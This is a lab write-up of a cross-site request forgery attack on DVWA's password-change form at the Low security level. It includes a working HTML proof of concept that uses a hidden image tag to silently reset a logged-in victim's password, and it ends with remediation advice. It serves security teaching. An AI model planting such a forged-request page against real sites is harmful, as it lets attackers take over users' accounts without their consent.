CSRF 
1. Vulnerability Summary
Cross-Site Request Forgery (CSRF) is an attack that tricks a victim’s web browser into performing an unwanted action on a different website where the victim is currently authenticated. Because the victim’s browser automatically includes their session cookies, the target application believes the request was intentionally made by the user.

2. Test Environment 
Path: vulnerabilities/csrf/

Mechanism: The application provides a password change form. Crucially, the form only requires the "New Password" and "Confirm Password" fields, failing to request the user's current password.

3. Exploitation Steps (PoC)
Step 1: Vulnerability Discovery
By analyzing the request sent when changing the password, we observe the following URL structure:
http://localhost/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change

Since there is no verification of the current password and no anti-CSRF token, we can trigger this action from any external source.

Step 2: Attacker’s Malicious Page
The attacker hosts a malicious web page that triggers the password change automatically when a logged-in victim visits it.

Example of a malicious HTML payload:

HTML
<html>
  <body>
    <h1>Click here for a special offer!</h1>
    <img src="http://localhost/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change" style="display:none;">
  </body>
</html>
Step 3: Execution
The victim, who is already logged into DVWA, visits the attacker's page.

The browser automatically requests the URL embedded in the src attribute.

The DVWA server processes the request and changes the victim's password to 123 without their knowledge or consent.

4. Technical Root Cause
At the "Low" security level, there is no protection:

Lack of Identity Verification: The site does not require the user's current password.

Missing Anti-CSRF Token: The application does not issue a unique, unpredictable token that must be submitted with the form to verify that the request originated from the legitimate application interface.

5. Remediation (How to fix)
Anti-CSRF Tokens: Implement a unique, cryptographically strong, and random token for every session or request. The server must validate this token before processing any state-changing action.

Re-authentication: Always require the user to provide their current password before allowing sensitive changes (like password updates or email changes).

SameSite Cookie Attribute: Set the SameSite attribute of session cookies to Strict or Lax to prevent the browser from sending cookies with cross-site requests.